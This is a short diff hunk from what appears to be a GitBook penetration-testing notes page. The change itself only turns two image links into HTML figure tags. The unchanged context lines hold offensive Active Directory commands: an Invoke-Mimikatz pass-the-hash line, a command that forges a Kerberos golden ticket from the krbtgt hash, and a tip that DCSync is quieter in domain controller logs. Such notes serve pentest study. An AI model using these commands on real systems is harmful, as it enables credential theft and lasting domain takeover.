@@ -66,9 +66,9 @@ Invoke-Mimikatz -command '"sekurlsa:pth /user:svcadmin /domain:dom.local /ntlm:h
 **Create a golden ticket when we have the krbtgt hash extracted from above** \
 ****Invoke-Mimikatz - command '"kerberos::golden /User:Administrator /domain:dom.local /sid:S-1-5-21-..... /krbtgt:hash.... id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
 
-![](<.gitbook/assets/image (2).png>)
+<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
 
-![](<.gitbook/assets/image (4).png>)
+<figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
 
 Use DCsync Attack / more silent in DC Logs\
 \
